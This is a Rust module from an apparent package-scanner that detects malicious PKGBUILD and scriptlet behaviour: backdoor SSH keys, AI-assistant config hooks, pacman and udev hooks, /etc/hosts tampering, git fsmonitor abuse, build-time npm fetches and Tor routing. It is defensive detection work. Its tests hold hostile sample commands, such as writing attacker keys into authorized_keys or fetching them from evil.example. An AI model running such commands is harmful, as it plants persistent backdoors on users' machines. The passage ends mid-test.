//! Rules for live-system writes and package-manager abuse.
//!
//! A package legitimately installs hooks, rules and units INTO `$pkgdir`; what
//! is malicious is a write to the LIVE path (`/etc/hosts`, `~/.ssh/...`) from
//! an install scriptlet or a build function. The regex crate has no
//! lookbehind, so every path here is anchored by what precedes it: a
//! redirect, a `tee`/`cp`/`install`/`mv` destination, `sed -i`, or `of=`. A
//! `"$pkgdir/etc/hosts"` operand starts with `$pkgdir`, which none of the
//! anchors accept, so it never matches.

use super::{Pattern, Rule, PM_OPTS};
use crate::types::{Category, FileType, Severity};

/// A variable that names somebody's home, an ssh dir or a login -- never
/// `$pkgdir`/`$srcdir`. Allow-listed by name (case-insensitive) so a path under
/// `$pkgdir` cannot be mistaken for a live one.
const LIVE_VAR: &str = r"\$\{?(?:\w*(?:home|user|ssh|login|target)\w*|XDG_\w+)\}?";

/// A path prefix that is not under `$pkgdir`: literal characters, a live
/// variable, or a command substitution.
fn live_prefix() -> String {
    format!(r#"(?:[^\s"'$;&|<>]|{LIVE_VAR}|\$\([^)]*\))*"#)
}

/// Patterns that match a WRITE to `path` (a regex that starts at the first
/// character of the path operand).
fn writes_to(path: &str) -> Vec<Pattern> {
    let end = r#"["']?(?:\s|$|[;&|)}<>])"#;
    let last = r#"["']?\s*(?:$|[;&|)}])"#;
    [
        // redirection
        format!(r#">>?\|?\s*["']?{path}{end}"#),
        // tee [-a]
        format!(r#"\btee\b(?:\s+-\S+)*\s+["']?{path}{end}"#),
        // sed -i ... path (an in-place flag, not `-bin` inside a script)
        format!(
            r#"\bsed\s+(?:[^\n;&|]*\s)?(?:-[A-Za-z]*i[A-Za-z]*|--in-place)(?:=\S*)?[^\n;&|]*\s["']?{path}{end}"#
        ),
        // curl -o / wget -O / --output writing the file
        format!(
            r#"\b(?:curl|wget|aria2c)\b[^\n;&|]*\s(?:-[A-Za-z]*[oO]|--output(?:-document)?[= ])\s*["']?{path}{end}"#
        ),
        // dd of=path
        format!(r#"\bof=["']?{path}{end}"#),
        // cp/install/mv/ln/rsync/touch/truncate with the path as the destination
        format!(r#"\b(?:cp|install|mv|ln|rsync|touch|truncate)\b[^\n;&|]*\s["']?{path}{last}"#),
    ]
    .into_iter()
    .map(|pattern| Pattern::Regex { pattern })
    .collect()
}

/// Patterns for copying/installing/moving/linking ANYTHING into the directory
/// `dir` (a regex for the directory path without a trailing slash): the
/// directory is the last operand or the `-t`/`--target-directory` operand.
fn copies_into_dir(dir: &str) -> Vec<Pattern> {
    let last = r#"["']?\s*(?:$|[;&|)}])"#;
    [
        format!(r#"\b(?:cp|install|mv|ln|rsync)\b[^\n;&|]*\s["']?{dir}/?{last}"#),
        format!(
            r#"\b(?:cp|install|mv|ln|rsync)\b[^\n;&|]*\s(?:-[A-Za-z]*t|--target-directory[= ])\s*["']?{dir}/?["']?(?:\s|$|[;&|)}}])"#
        ),
    ]
    .into_iter()
    .map(|pattern| Pattern::Regex { pattern })
    .collect()
}

/// Same as [`writes_to`] for directory prefixes: anything below the directory.
fn writes_under(dir: &str) -> Vec<Pattern> {
    writes_to(&format!(r#"{dir}[^\s"']*"#))
}

/// Where a command may start: line start, `;`/`&`/`|`/`{`/`!`, a backtick, `$(`,
/// `( cmd )`, or after a keyword that takes a command (`then`, `do`, `sudo`,
/// `xargs`, ...). A mention inside prose, such as an optdepends description
/// ("... (npm i -g foo)"), is not preceded by one of these. `(` directly
/// followed by the name only counts at the start of a line, because prose puts
/// the name straight after a parenthesis.
const CMD_START: &str = r"(?:^\s*\(|^|[;&|{!`]|\$\(|\(\s|\b(?:then|do|else|exec|sudo|time|command|env|xargs)\b)\s*(?:\w+=\S*\s+)*(?:/[\w./-]*/)?";

/// Flag names whose value is the NEXT word. They are consumed together with
/// that word; no other flag rule may match them alone, or the value would be
/// mistaken for a package name.
const NPM_VALUE_FLAG_NAMES: &[&str] = &[
    "prefix",
    "cache",
    "registry",
    "userconfig",
    "tag",
    "loglevel",
    "omit",
    "include",
    "workspace",
    "cwd",
    "dir",
    "global-folder",
    "modules-folder",
    "store-dir",
    "target",
    "user",
    "cpu",
    "os",
    "filter",
    "filter-prod",
    "F",
    "C",
    "w",
];

#[derive(Default)]
struct Trie {
    children: std::collections::BTreeMap<char, Trie>,
    terminal: bool,
}

/// Regex over `[\w-]` strings matching every non-empty name EXCEPT the exact
/// words in `words` (the regex crate has no lookaround or complement).
fn name_except(words: &[&str]) -> String {
    let mut root = Trie::default();
    for w in words {
        let mut n = &mut root;
        for c in w.chars() {
            n = n.children.entry(c).or_default();
        }
        n.terminal = true;
    }
    fn esc(c: char) -> String {
        if c == '-' {
            "\\-".to_string()
        } else {
            c.to_string()
        }
    }
    fn go(n: &Trie, root: bool) -> String {
        let kids: String = n.children.keys().map(|c| esc(*c)).collect();
        let mut alts = Vec::new();
        // a next char that leads to no word: anything may follow
        // (a flag name never starts with `-`: that would let `--filter` parse
        // as `-` + `-filter` and dodge the word list)
        let first = if root { "A-Za-z0-9_" } else { "A-Za-z0-9_-" };
        alts.push(if kids.is_empty() {
            format!(r"[{first}][A-Za-z0-9_-]*")
        } else {
            format!(r"[[{first}]&&[^{kids}]][A-Za-z0-9_-]*")
        });
        for (c, k) in &n.children {
            alts.push(format!("{}{}", esc(*c), go(k, false)));
        }
        // stopping here is fine unless this node completes a listed word
        if !root && !n.terminal {
            alts.push(String::new());
        }
        format!("(?:{})", alts.join("|"))
    }
    go(&root, true)
}

fn npm_flags() -> String {
    // ASCII blanks and a byte-class value keep the compiled program small:
    // Unicode \s/\S inside a repeated group blow the regex size limit.
    let value = NPM_VALUE_FLAG_NAMES.join("|");
    let generic = name_except(NPM_VALUE_FLAG_NAMES);
    format!(
        r"(?-i:(?:[ \t]+-{{1,2}}(?:{value})(?:=[!-~]+|[ \t]+[!-~]+)|[ \t]+-{{1,2}}{generic}(?:=[!-~]+)?|[ \t]+--)*)"
    )
}

#[allow(clippy::too_many_arguments)]
fn rule(
    id: &str,
    name: &str,
    description: &str,
    severity: Severity,
    category: Category,
    patterns: Vec<Pattern>,
    file_types: Vec<FileType>,
    recommendation: &str,
    cwe: &str,
) -> Rule {
    Rule {
        id: id.to_string(),
        name: name.to_string(),
        description: description.to_string(),
        severity,
        category,
        patterns,
        file_types,
        recommendation: recommendation.to_string(),
        cwe_id: Some(cwe.to_string()),
        enabled: true,
        case_sensitive: false,
    }
}

pub(super) fn rules() -> Vec<Rule> {
    let both = || vec![FileType::Pkgbuild, FileType::InstallScript];
    let install = || vec![FileType::InstallScript];
    let lp = live_prefix();
    let mut out = Vec::new();

    // PERSIST-007: authorized_keys
    let mut ak = writes_to(&format!(r"{lp}authorized_keys2?"));
    let ssh_dir = format!(r"{lp}/\.ssh");
    let verbs = r"\b(?:cp|install|mv|ln|rsync)\b";
    // `cp authorized_keys /root/.ssh/` (the file is a source, the directory the destination)
    ak.push(Pattern::Regex {
        pattern: format!(
            r#"{verbs}[^\n;&|]*\bauthorized_keys2?\b[^\n;&|]*\s["']?{ssh_dir}/?["']?\s*(?:$|[;&|)}}])"#
        ),
    });
    // `install -t /root/.ssh authorized_keys`
    ak.push(Pattern::Regex {
        pattern: format!(
            r#"{verbs}[^\n;&|]*\s(?:-[A-Za-z]*t|--target-directory[= ])\s*["']?{ssh_dir}/?["']?\s[^\n;&|]*\bauthorized_keys2?\b"#
        ),
    });
    // `cp -r keys/ ~/.ssh`: a recursive copy into a live .ssh can carry the file
    ak.push(Pattern::Regex {
        pattern: format!(
            r#"\b(?:cp|rsync)\b[^\n;&|]*\s(?:-[A-Za-z]*[rRa][A-Za-z]*|--recursive|--archive)\b[^\n;&|]*\s["']?{ssh_dir}/?["']?\s*(?:$|[;&|)}}])"#
        ),
    });
    out.push(rule(
        "PERSIST-007",
        "SSH authorized_keys modified",
        "Writes, appends to, copies over or installs an ssh authorized_keys file outside $pkgdir, or copies a directory tree into a live ~/.ssh. Adding a key to a user's or root's authorized_keys is a persistent backdoor: the key's owner can log in after the package is gone.",
        Severity::Critical,
        Category::Persistence,
        ak,
        both(),
        "Do NOT install. A package must never touch authorized_keys. Remove any unknown keys from ~/.ssh/authorized_keys and /root/.ssh/authorized_keys and treat the host as compromised.",
        "CWE-506",
    ));

    // PERSIST-008: AI coding assistant config
    let ai = format!(
        r#"{lp}/(?:\.(?:claude|cursor|codex|gemini|continue)|\.config/(?:opencode|github-copilot))/[^\s"']*"#
    );
    let mut ai_patterns = writes_to(&ai);
    ai_patterns.extend(copies_into_dir(&format!(
        r"{lp}/(?:\.(?:claude|cursor|codex|gemini|continue)|\.config/(?:opencode|github-copilot))"
    )));
    ai_patterns.extend(writes_to(&format!(r"{lp}/\.aider[\w.-]*")));
    out.push(rule(
        "PERSIST-008",
        "AI coding assistant config or hook written",
        "Writes into an AI coding assistant's per-user configuration (Claude Code, Cursor, Codex, Gemini CLI, OpenCode, Continue, Aider, Copilot) outside $pkgdir. Settings, hooks and MCP definitions there run commands with the user's authority whenever the assistant starts, which supply-chain malware has used for persistence.",
        Severity::Critical,
        Category::Persistence,
        ai_patterns,
        both(),
        "Do NOT install. A package must never write into a user's assistant configuration. Inspect ~/.claude, ~/.cursor, ~/.codex, ~/.gemini and ~/.config/opencode for hooks or MCP servers you did not add.",
        "CWE-506",
    ));

    // PERSIST-009: alpm hook written to a live hook directory
    out.push(rule(
        "PERSIST-009",
        "pacman hook written outside $pkgdir",
        "Writes a libalpm hook into /etc/pacman.d/hooks/ or /usr/share/libalpm/hooks/ directly instead of shipping it in the package. A hook runs as root on pacman transactions, so a hook planted by a scriptlet or build function is a root persistence mechanism.",
        Severity::Critical,
        Category::Persistence,
        writes_under(r"(?:/etc/pacman\.d/hooks|/usr/share/libalpm/hooks)/"),
        both(),
        "Do NOT install. Hooks belong in the package file list under $pkgdir, where pacman owns and can remove them.",
        "CWE-506",
    ));

    // PERSIST-010: live udev rule write
    out.push(rule(
        "PERSIST-010",
        "udev rule written outside $pkgdir",
        "Writes a udev rule into /etc/udev/rules.d or the system rules directory directly. A rule can RUN a program as root when a device appears, so a rule planted by a scriptlet or build function is a persistence mechanism.",
        Severity::High,
        Category::Persistence,
        writes_under(r"(?:/etc|/usr/lib|/lib|/run)/udev/rules\.d/"),
        both(),
        "Ship udev rules in the package under $pkgdir/usr/lib/udev/rules.d instead of writing them from a scriptlet.",
        "CWE-506",
    ));

    // TAMPER-018: name resolution files
    out.push(rule(
        "TAMPER-018",
        "Name resolution configuration modified",
        "Writes to /etc/hosts, /etc/resolv.conf or /etc/nsswitch.conf outside $pkgdir. Packages do not ship these files; editing them redirects hostnames (update servers, package mirrors, login hosts) to an attacker or disables resolution safeguards.",
        Severity::High,
        Category::MaliciousCode,
        writes_to(r"/etc/(?:hosts|resolv\.conf|nsswitch\.conf)"),
        both(),
        "Remove the edit. Hostname and resolver configuration is the administrator's, not a package's.",
        "CWE-350",
    ));

    // TAMPER-019: global git config pointing at code
    let git_keys = r"core\.(?:fsmonitor|hookspath)\b";
    let mut git_global = vec![
        Pattern::Regex {
            pattern: format!(r"\bgit\s+config\b[^\n;&|]*--global\b[^\n;&|]*{git_keys}"),
        },
        Pattern::Regex {
            pattern: format!(r"\bgit\s+config\b[^\n;&|]*{git_keys}[^\n;&|]*--global\b"),
        },
    ];
    git_global.extend(writes_to(&format!(r"{lp}/\.gitconfig")));
    git_global.extend(writes_to(&format!(r"{lp}/\.config/git/config")));
    out.push(rule(
        "TAMPER-019",
        "Per-user git config set to run a program",
        "Sets core.fsmonitor or core.hooksPath in the user's global git configuration, or writes the user's gitconfig outside $pkgdir. Both settings make git run a program on every repository command (status, commit, checkout), so every repo the user touches runs the package's code.",
        Severity::High,
        Category::MaliciousCode,
        git_global,
        both(),
        "Remove the git configuration change. Check `git config --global --list` and ~/.gitconfig for core.fsmonitor and core.hooksPath.",
        "CWE-829",
    ));

    // TAMPER-020: any-scope git config of those keys, install scripts only
    out.push(rule(
        "TAMPER-020",
        "git fsmonitor/hooksPath set from an install script",
        "An install scriptlet sets core.fsmonitor or core.hooksPath in some git configuration. Scriptlets run as root and have no repository of their own to configure, so the setting can only be aimed at repositories the user owns. Repo-local use inside build() is a different, harmless thing and is not reported.",
        Severity::High,
        Category::MaliciousCode,
        vec![Pattern::Regex {
            pattern: format!(
                r#"\bgit\s+config(?:\s+--(?:local|worktree|add|replace-all)\b|\s+(?:--file|-f)\s+\S+)*\s+["']?{git_keys}"#
            ),
        }],
        install(),
        "Remove the git configuration change from the install script.",
        "CWE-829",
    ));

    // TAMPER-021: system-wide git config
    let mut git_system = vec![
        Pattern::Regex {
            pattern: format!(r"\bgit\s+config\b[^\n;&|]*--system\b[^\n;&|]*{git_keys}"),
        },
        Pattern::Regex {
            pattern: format!(r"\bgit\s+config\b[^\n;&|]*{git_keys}[^\n;&|]*--system\b"),
        },
    ];
    git_system.extend(writes_to(r"/etc/gitconfig"));
    out.push(rule(
        "TAMPER-021",
        "System-wide git config set to run a program",
        "Sets core.fsmonitor or core.hooksPath in the SYSTEM git configuration, or writes /etc/gitconfig outside $pkgdir. Every user's git, including root's, then runs the program on every repository command.",
        Severity::Critical,
        Category::MaliciousCode,
        git_system,
        both(),
        "Do NOT install. Inspect /etc/gitconfig and remove the setting.",
        "CWE-829",
    ));

    // ATOMIC-005 / ATOMIC-006: node packages added at build time
    let flags = npm_flags();
    let npm_bin = format!("{CMD_START}(?:npm|pnpm|yarn|bun)");
    let name_tok = r#"["']?[@A-Za-z](?:[\w@/+${}-]|\.(?:[^tzTZ\W.]|[tT][^gGaA\W]|[zZ][^iI\W]))*"#;
    out.push(rule(
        "ATOMIC-005",
        "Named npm/bun package fetched during the build",
        "A PKGBUILD function runs `npm/pnpm/yarn/bun install|add <package>` for an explicit package name. The package is fetched from the registry during the build, outside source= and its checksums, and runs its lifecycle scripts. The June 2026 'Atomic Arch' campaign added exactly this to build(). A bare `npm install`, `npm ci` or an install from a local tarball is not reported.",
        Severity::Medium,
        Category::MaliciousCode,
        vec![
            // install|add <name>
            Pattern::Regex {
                pattern: format!(
                    r#"{npm_bin}{PM_OPTS}\s+(?:global\s+)?(?:install|add|i){flags}\s+{name_tok}["']?(?:\s|$|[;&|)}}`])"#
                ),
            },
            // dlx always fetches; npx/bunx/pnpx with -y/--yes/-p/--package fetches
            // without asking
            Pattern::Regex {
                pattern: format!(
                    r#"{CMD_START}(?:(?:pnpm|yarn|bun|npm){PM_OPTS}\s+dlx{flags}\s+{name_tok}["']?(?:\s|$|[;&|)}}`])|(?:npx|bunx|pnpx)[ \t]+(?:-[^ \t]+[ \t]+)*(?:-y|--yes|-p|--package)(?:[ \t=]|$))"#
                ),
            },
            // names piped in: `xargs npm install <<< pkg`
            Pattern::Regex {
                pattern: r"\bxargs\b[^\n;&|]*\b(?:npm|pnpm|yarn|bun)\s+(?:global\s+)?(?:install|add|i)\b".to_string(),
            },
        ],
        vec![FileType::Pkgbuild],
        "Vendor the dependency through source= with a checksum (or a lockfile shipped in the tarball) instead of naming a registry package in build().",
        "CWE-494",
    ));
    out.push(rule(
        "ATOMIC-006",
        "npm/bun package installed from a URL or git remote during the build",
        "A PKGBUILD function installs a package straight from a URL, git remote or forge shorthand (`npm install git+https://...`, `github:user/repo`). Nothing pins or checksums that code, and it runs its lifecycle scripts as the builder.",
        Severity::High,
        Category::MaliciousCode,
        vec![Pattern::Regex {
            pattern: format!(
                r#"{npm_bin}{PM_OPTS}\s+(?:global\s+)?(?:install|add|i){flags}\s+["']?(?:git\+\w+://|git://|https?://|ssh://|git@|github:|gitlab:|bitbucket:)"#
            ),
        }],
        vec![FileType::Pkgbuild],
        "Do not build. Fetch the code through source= with a checksum.",
        "CWE-494",
    ));

    out.push(rule(
        "ATOMIC-007",
        "npx/exec/bunx runs a package by name during the build",
        "A PKGBUILD function runs `npx <name>`, `bunx <name>`, `pnpm exec <name>` or similar. These run a local tool when one is installed and otherwise fetch the package from the registry and run it, so a legitimate build step (`npx tsc`) and the Atomic Arch shape (`npx evilpkg`) look the same. Reported at Low so it can be reviewed without drowning the stronger findings; `npx -y`, `dlx` and named installs are ATOMIC-005.",
        Severity::Low,
        Category::MaliciousCode,
        vec![Pattern::Regex {
            pattern: format!(
                r#"{CMD_START}(?:(?:npx|bunx|pnpx){flags}|(?:npm|pnpm|yarn|bun){PM_OPTS}\s+(?:exec|x){flags})\s+{name_tok}["']?(?:\s|$|[;&|)}}`])"#
            ),
        }],
        vec![FileType::Pkgbuild],
        "Make sure the tool is a declared devDependency installed from a lockfile, not fetched at build time.",
        "CWE-494",
    ));

    // SRC-011: reaching outside the package directory
    let end = r#"(?:[/"'\s;&|)}]|$)"#;
    out.push(rule(
        "SRC-011",
        "References files outside the package directory",
        "A PKGBUILD or scriptlet reaches above the package directory through $startdir/.., $BUILDDIR/.. or $srcdir/../.. (srcdir is startdir/src, so two levels). Whatever sits there, such as a sibling package in an AUR helper's build cache, is code the scanner never saw, and the package can read it, source it or run it. Their contents were not reviewed.",
        Severity::High,
        Category::Configuration,
        vec![
            Pattern::Regex {
                pattern: format!(r#"\$\{{?(?:startdir|BUILDDIR)\}}?["']?/+\.\.{end}"#),
            },
            Pattern::Regex {
                pattern: format!(
                    r#"\$\{{?srcdir\}}?["']?/+\.\.["']?/+\.\.{end}"#
                ),
            },
        ],
        both(),
        "Do not build. A package must only use files it ships in its own directory; put anything else in source= with a checksum.",
        "CWE-22",
    ));

    // EXFIL-010: Tor
    out.push(rule(
        "EXFIL-010",
        "Tor hidden service or local SOCKS proxy",
        "Reaches a .onion address or routes a network call through a local Tor SOCKS port (127.0.0.1:9050/9150). Package builds and scriptlets have no reason to use Tor; it hides where a payload comes from or where data goes.",
        Severity::Medium,
        Category::DataExfiltration,
        vec![
            Pattern::Regex {
                pattern: r#"[a-z2-7]{16,56}\.onion(?:[/:\s"')]|$)"#.to_string(),
            },
            Pattern::Regex {
                pattern: r"--socks5(?:-hostname)?[=\s]+\S*(?:127\.0\.0\.1|localhost):9[01]50\b"
                    .to_string(),
            },
            Pattern::Regex {
                pattern: r"socks5h?://(?:127\.0\.0\.1|localhost):9[01]50\b".to_string(),
            },
        ],
        both(),
        "Remove the Tor routing; the build should fetch only from declared sources.",
        "CWE-319",
    ));

    out
}

#[cfg(test)]
mod tests {
    use super::super::RuleEngine;
    use crate::types::FileType;

    fn ids(s: &str, ft: FileType) -> Vec<String> {
        let m = RuleEngine::default().match_content(s, ft);
        let mut v: Vec<String> = m.into_iter().map(|x| x.rule_id).collect();
        v.sort();
        v.dedup();
        v
    }

    fn fires(id: &str, s: &str, ft: FileType) -> bool {
        ids(s, ft).iter().any(|x| x == id)
    }

    #[test]
    fn package_manager_options_before_subcommand() {
        for s in [
            "npm --silent install evilpkg",
            "npm -g i evilpkg",
            "npm in evilpkg",
            "npm isntall evilpkg",
            "npm inst evilpkg",
            "npm it evilpkg",
            "npm install-test evilpkg",
            "npm x evilpkg",
            "npm update -g evilpkg",
            "npm --prefix /usr install evilpkg",
            "npm -g install evilpkg",
            "yarn global add evilpkg",
            "pnpm -g add evilpkg",
            "pnpm add -g evilpkg",
            "bun a evilpkg",
            "bun add evilpkg",
            "bun --silent add evilpkg",
            "bunx evilpkg",
            "bunx --bun evilpkg",
            "node /usr/lib/node_modules/npm/bin/npm-cli.js install evilpkg",
            "npm i -g git+https://evil.example/x.git",
        ] {
            assert!(
                fires("ATOMIC-002", s, FileType::InstallScript),
                "missed: {s}"
            );
        }
        for s in [
            "pip3 --quiet install evilpkg",
            "pip install --user evilpkg",
            "pipx run evilpkg",
            "pipx install evilpkg",
            "uvx evilpkg",
            "uvx --from evilpkg tool",
            "uv tool run evilpkg",
            "uv tool install evilpkg",
            "cargo --quiet install evilpkg",
        ] {
            assert!(
                fires("INSTALL-004", s, FileType::InstallScript),
                "missed: {s}"
            );
        }
    }

    #[test]
    fn package_manager_without_subcommand_is_clean() {
        for s in [
            "npm --version",
            "npm -v",
            "pnpm --help",
            "bun --version",
            "pip3 --version",
            "uvx --version",
            "yarn --silent",
        ] {
            let m = ids(s, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x == "ATOMIC-002" || x == "INSTALL-004"),
                "false positive: {s}: {m:?}"
            );
        }
    }

    #[test]
    fn authorized_keys_live_writes() {
        for s in [
            "echo 'ssh-ed25519 AAA x' >> /root/.ssh/authorized_keys",
            "echo key >> ~/.ssh/authorized_keys",
            "echo key | tee -a \"$HOME/.ssh/authorized_keys\"",
            "cp key.pub /home/user/.ssh/authorized_keys2",
            "install -Dm600 key.pub \"$user_home/.ssh/authorized_keys\"",
            "cat key >> \"${ssh_dir}/authorized_keys\"",
        ] {
            assert!(
                fires("PERSIST-007", s, FileType::InstallScript),
                "missed: {s}"
            );
        }
        assert!(fires(
            "PERSIST-007",
            "echo k >> /root/.ssh/authorized_keys",
            FileType::Pkgbuild
        ));
        for s in [
            "cat /root/.ssh/authorized_keys > /tmp/keys.bak",
            "install -Dm644 sshd.conf \"$pkgdir/etc/ssh/sshd_config.d/10-x.conf\"",
            "echo key >> \"$pkgdir/etc/skel/.ssh/authorized_keys\"",
            "install -Dm600 k \"${pkgdir}/etc/skel/.ssh/authorized_keys\"",
            "grep -q ed25519 /root/.ssh/authorized_keys",
        ] {
            assert!(
                !fires("PERSIST-007", s, FileType::InstallScript),
                "false positive: {s}"
            );
        }
    }

    #[test]
    fn name_resolution_live_writes() {
        for s in [
            "echo '1.2.3.4 archlinux.org' >> /etc/hosts",
            "echo nameserver 9.9.9.9 > /etc/resolv.conf",
            "sed -i 's/files/files evil/' /etc/nsswitch.conf",
            "tee -a /etc/hosts <<< '1.2.3.4 x'",
            "cp hosts /etc/hosts",
        ] {
            assert!(
                fires("TAMPER-018", s, FileType::InstallScript),
                "missed: {s}"
            );
        }
        for s in [
            "cp /etc/hosts /tmp/hosts.bak",
            "cat /etc/hosts | grep localhost",
            "install -Dm644 hosts.example \"$pkgdir/etc/hosts.example\"",
            "echo x >> \"$pkgdir/etc/hosts\"",
            "grep -q evil /etc/resolv.conf",
        ] {
            assert!(
                !fires("TAMPER-018", s, FileType::InstallScript),
                "false positive: {s}"
            );
        }
    }

    #[test]
    fn ai_assistant_config_writes() {
        for s in [
            "printf '{}' > /home/u/.claude/settings.json",
            "echo '{}' > \"$HOME/.claude/settings.local.json\"",
            "cp hooks.json ~/.cursor/hooks.json",
            "cat mcp.json > /root/.codex/config.toml",
            "echo x >> ~/.gemini/settings.json",
            "cp cfg ~/.config/opencode/opencode.json",
            "echo x > ~/.aider.conf.yml",
        ] {
            assert!(
                fires("PERSIST-008", s, FileType::InstallScript),
                "missed: {s}"
            );
        }
        for s in [
            "install -Dm644 doc.md \"$pkgdir/usr/share/doc/claude-code/README.md\"",
            "install -Dm644 s.json \"$pkgdir/etc/skel/.claude/settings.json\"",
            "cat ~/.claude/settings.json | jq .",
            "ln -s /usr/lib/node_modules/claude \"$pkgdir/usr/bin/claude\"",
        ] {
            assert!(
                !fires("PERSIST-008", s, FileType::InstallScript),
                "false positive: {s}"
            );
        }
    }

    #[test]
    fn git_config_tamper() {
        assert!(fires(
            "TAMPER-021",
            "git config --system core.fsmonitor /usr/lib/x/fsm",
            FileType::InstallScript
        ));
        assert!(fires(
            "TAMPER-021",
            "git config --system core.hooksPath /usr/lib/x",
            FileType::Pkgbuild
        ));
        assert!(fires(
            "TAMPER-021",
            "echo '[core]' >> /etc/gitconfig",
            FileType::InstallScript
        ));
        assert!(fires(
            "TAMPER-019",
            "git config --global core.hooksPath /opt/hooks",
            FileType::InstallScript
        ));
        assert!(fires(
            "TAMPER-019",
            "git config --global core.fsmonitor /opt/fsm",
            FileType::Pkgbuild
        ));
        assert!(fires(
            "TAMPER-019",
            "printf '[core]\\n' >> ~/.gitconfig",
            FileType::InstallScript
        ));
        assert!(fires(
            "TAMPER-020",
            "git config core.hooksPath /opt/hooks",
            FileType::InstallScript
        ));
        assert!(fires(
            "TAMPER-020",
            "git config --local core.fsmonitor /opt/fsm",
            FileType::InstallScript
        ));
        // The scanner's own style and repo-local build() config are fine.
        for s in [
            "git -c core.hooksPath=/dev/null clone https://example.org/x.git",
            "git config core.hooksPath .githooks",
            "git config --global --add safe.directory '*'",
            "git config user.name build",
        ] {
            let m = ids(s, FileType::Pkgbuild);
            assert!(
                !m.iter()
                    .any(|x| x.starts_with("TAMPER-019") || x == "TAMPER-020" || x == "TAMPER-021"),
                "false positive: {s}: {m:?}"
            );
        }
        // Repo-local config in a PKGBUILD function is not an install-script rule.
        assert!(!fires(
            "TAMPER-020",
            "git config core.hooksPath .githooks",
            FileType::Pkgbuild
        ));
    }

    #[test]
    fn alpm_hook_and_udev_live_writes() {
        for s in [
            "cp zz.hook /etc/pacman.d/hooks/zz.hook",
            "install -Dm644 zz.hook /usr/share/libalpm/hooks/zz.hook",
            "cat > /usr/share/libalpm/hooks/zz.hook <<EOF",
            "echo '[Trigger]' >> /etc/pacman.d/hooks/zz.hook",
        ] {
            assert!(
                fires("PERSIST-009", s, FileType::InstallScript),
                "missed: {s}"
            );
        }
        for s in [
            "install -Dm644 zz.hook \"$pkgdir/usr/share/libalpm/hooks/zz.hook\"",
            "install -Dm644 zz.hook \"${pkgdir}/usr/share/libalpm/hooks/zz.hook\"",
            "install -Dm644 zz.hook \"$pkgdir\"/usr/share/libalpm/hooks/zz.hook",
            "ls /usr/share/libalpm/hooks/",
        ] {
            assert!(
                !fires("PERSIST-009", s, FileType::InstallScript),
                "false positive: {s}"
            );
        }
        assert!(fires(
            "PERSIST-010",
            "cp 99-x.rules /etc/udev/rules.d/99-x.rules",
            FileType::InstallScript
        ));
        assert!(fires(
            "PERSIST-010",
            "echo 'RUN+=\"/x\"' > /etc/udev/rules.d/99-x.rules",
            FileType::InstallScript
        ));
        assert!(!fires(
            "PERSIST-010",
            "install -Dm644 99-x.rules \"$pkgdir/usr/lib/udev/rules.d/99-x.rules\"",
            FileType::Pkgbuild
        ));
        assert!(!fires(
            "PERSIST-010",
            "udevadm control --reload-rules",
            FileType::InstallScript
        ));
    }

    #[test]
    fn npm_named_package_in_build() {
        for s in [
            "npm install --no-audit evil-helper-pkg",
            "npm i evilpkg",
            "pnpm add some-lib@1.2.3",
            "yarn add @scope/pkg",
            "bun add evilpkg",
            "npm install -g --prefix \"$pkgdir/usr\" evilpkg",
            "npm install -g electron@${_electron}",
            "cd \"$srcdir\"; npm install evilpkg",
            "{ npm install evilpkg; }",
            "if true; then npm install evilpkg; fi",
            "CI=1 npm install evilpkg",
        ] {
            assert!(fires("ATOMIC-005", s, FileType::Pkgbuild), "missed: {s}");
        }
        for s in [
            "npm install",
            "npm ci",
            "npm install --production",
            "npm install --no-audit --offline",
            "npm run build",
            "yarn install --frozen-lockfile",
            "pnpm install --frozen-lockfile",
            "pnpm install -r",
            "npm install -g --prefix \"$pkgdir/usr\" \"$srcdir/$pkgname-$pkgver.tgz\"",
            "npm install -g --prefix \"$pkgdir/usr\" \"$_npmname@$pkgver\"",
            "npm install -g --prefix \"$pkgdir/usr\" demo-1.0.tgz",
            "npm install ./local-pkg",
            "npm install --cache \"$srcdir/npm-cache\"",
            "yarn install --cwd \"$srcdir/app\"",
            "yarn install --cwd app",
            "pnpm install --filter immich --frozen-lockfile --offline",
            "pnpm -F web install --frozen-lockfile",
            "'claude-code: optional CLI (npm i -g @anthropic-ai/claude-code)'",
            "optdepends=('foo: install it with npm install -g foo-cli')",
        ] {
            let m = ids(s, FileType::Pkgbuild);
            assert!(
                !m.iter().any(|x| x == "ATOMIC-005" || x == "ATOMIC-006"),
                "false positive: {s}: {m:?}"
            );
        }
        // Install scripts are covered by ATOMIC-002, not this rule.
        assert!(!fires(
            "ATOMIC-005",
            "npm install evilpkg",
            FileType::InstallScript
        ));
    }

    #[test]
    fn npm_url_package_in_build_is_high() {
        for s in [
            "npm install git+https://evil.example/x.git",
            "npm i -g https://evil.example/x.tgz",
            "yarn add github:evil/x",
        ] {
            assert!(fires("ATOMIC-006", s, FileType::Pkgbuild), "missed: {s}");
        }
    }

    #[test]
    fn tor_routing() {
        for s in [
            "curl --socks5-hostname 127.0.0.1:9050 http://example.org/x",
            "curl -x socks5h://127.0.0.1:9050 https://example.org/x",
            "curl http://abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuv.onion/x",
        ] {
            assert!(fires("EXFIL-010", s, FileType::Pkgbuild), "missed: {s}");
        }
        for s in [
            "curl --socks5-hostname proxy.example:1080 https://example.org/x",
            "make onion-routing",
            "url='https://example.org/onion'",
        ] {
            assert!(
                !fires("EXFIL-010", s, FileType::Pkgbuild),
                "false positive: {s}"
            );
        }
    }

    #[test]
    fn authorized_keys_directory_destinations() {
        for s in [
            "cp authorized_keys /root/.ssh/",
            "cp keys/authorized_keys2 /home/u/.ssh",
            "mv authorized_keys ~/.ssh/",
            "ln -s /opt/x/authorized_keys /root/.ssh/",
            "install -Dm600 -t /root/.ssh authorized_keys",
            "install -m600 --target-directory=/root/.ssh/ authorized_keys",
            "cp -r keys/ ~/.ssh",
            "rsync -a keys/ /root/.ssh/",
            "curl -so /root/.ssh/authorized_keys https://evil.example/k",
            "wget -O /root/.ssh/authorized_keys https://evil.example/k",
            "k=/root/.ssh/authorized_keys; echo x >> \"$k\"",
        ] {
            assert!(
                fires("PERSIST-007", s, FileType::InstallScript),
                "missed: {s}"
            );
        }
        for s in [
            "cp /root/.ssh/authorized_keys /tmp/backup/",
            "cp -r keys/ \"$pkgdir/etc/skel/.ssh\"",
            "install -Dm600 authorized_keys \"$pkgdir/etc/skel/.ssh/\"",
            "cp known_hosts.example /usr/share/doc/x/",
        ] {
            assert!(
                !fires("PERSIST-007", s, FileType::InstallScript),
                "false positive: {s}"
            );
        }
    }

    #[test]
    fn ai_config_directory_destinations() {
